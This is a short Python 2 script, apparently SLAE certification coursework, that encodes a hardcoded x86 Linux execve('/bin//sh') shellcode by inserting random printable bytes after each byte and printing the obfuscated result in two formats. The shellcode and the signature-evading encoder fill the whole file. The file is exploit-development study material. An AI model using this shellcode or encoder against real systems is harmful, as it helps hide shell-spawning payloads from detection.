#!/usr/bin/python

#;This Python code has been created for completing
#;the requirements of the SecurityTube Linux
#;Assembly Expert certification:
#;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert
#;
#;Student ID: SLAE-500

# Python Insertion Encoder 
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x							#pick a random number of random bytes to be insterted
	no_of_bytes = random.randint(1,10)				#increase the value for more random bytes to be inserted
	encoded += '\\x%02x' % no_of_bytes 				#insert the number that specifies how many rnadom bytes have been inserted after this one
	list_of_rand_bytes = random.sample(range(33,126),no_of_bytes) # list of random bytes (30-126, look at the ASCII Table, only alpha-numeric)
	for insert_byte in list_of_rand_bytes: 			#insert the random bytes
		encoded += '\\x%02x' % insert_byte

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % no_of_bytes
	for insert_byte in list_of_rand_bytes:			#insert the random bytes
		encoded2 += '0x%02x,' % insert_byte			

#the end characters are End-of-Transmission char (CTRL+D - 4 in ASCII), seemed appropriate
#!!!CHANGE THIS WITH A CHAR THAT DOESN'T EXIST IN YOUR SHELLCODE! DO THE SAME IN THE DECODER WHERE YOU SEE THE SAME WARNING!

encoded += ('\\x%02x' % 4) * 2
encoded2 += ('0x%02x,' % 4) * 2

print encoded

print encoded2


